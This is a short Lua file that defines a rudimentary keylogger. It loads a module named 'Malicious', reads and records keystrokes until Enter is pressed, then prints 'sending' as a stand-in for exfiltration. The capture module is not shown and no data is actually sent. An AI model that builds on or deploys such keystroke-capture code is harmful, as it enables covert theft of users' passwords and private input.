local mylib = require("Malicious")

function keylogger()
	
	local Pressed = {}

	while true do
		local keyValue = mylib.getKey()
		local key = asciiToString(keyValue)

		print(key)

		if(keyValue==13) then
			print("sending")
			break
		end

		table.insert(Pressed,key)

	end

	return Pressed

end

function asciiToString(asciiValue)
    return string.char(asciiValue)
end